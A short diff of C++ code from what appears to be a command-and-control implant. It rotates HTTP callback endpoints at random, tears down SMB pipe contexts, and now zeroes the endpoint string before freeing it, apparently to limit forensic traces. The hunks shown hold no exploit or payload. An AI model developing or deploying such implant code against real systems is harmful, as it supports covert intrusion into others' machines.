@@ -46,9 +46,13 @@ namespace Http {
         HEXANE
 
         if (req_ctx) {
-            if (req_ctx->req_handle) { Ctx->win32.WinHttpCloseHandle(req_ctx->req_handle); }
-            if (req_ctx->conn_handle) { Ctx->win32.WinHttpCloseHandle(req_ctx->conn_handle); }
-            if (req_ctx->endpoint) { x_free(req_ctx->endpoint); }
+            if (req_ctx->req_handle)    { Ctx->win32.WinHttpCloseHandle(req_ctx->req_handle); }
+            if (req_ctx->conn_handle)   { Ctx->win32.WinHttpCloseHandle(req_ctx->conn_handle); }
+
+            if (req_ctx->endpoint) {
+                x_memset(req_ctx->endpoint, 0, x_wcslen(req_ctx->endpoint) * sizeof(wchar_t));
+                x_free(req_ctx->endpoint);
+            }
         }
     }
 
@@ -82,8 +86,8 @@ namespace Http {
         }
 
         if (Ctx->transport.http->endpoints) {
-            n_endpoint = Utils::Random::RandomNumber32();
-            endpoint =  Ctx->transport.http->endpoints[n_endpoint % Ctx->transport.http->n_endpoints];
+            n_endpoint  = Utils::Random::RandomNumber32();
+            endpoint    =  Ctx->transport.http->endpoints[n_endpoint % Ctx->transport.http->n_endpoints];
 
             req_ctx->endpoint = R_CAST(wchar_t*, x_malloc((x_wcslen(endpoint) + 1) * sizeof(wchar_t)));
             x_memcpy(req_ctx->endpoint, endpoint, (x_wcslen(endpoint) + 1) * sizeof(wchar_t));
@@ -260,7 +264,7 @@ namespace Http {
 
 namespace Smb {
 
-    VOID SmbContextDestroy(const PSMB_PIPE_SEC_ATTR SmbSecAttr) {
+    VOID SmbContextDestroy(PSMB_PIPE_SEC_ATTR SmbSecAttr) {
         HEXANE
 
         if (SmbSecAttr->sid) {
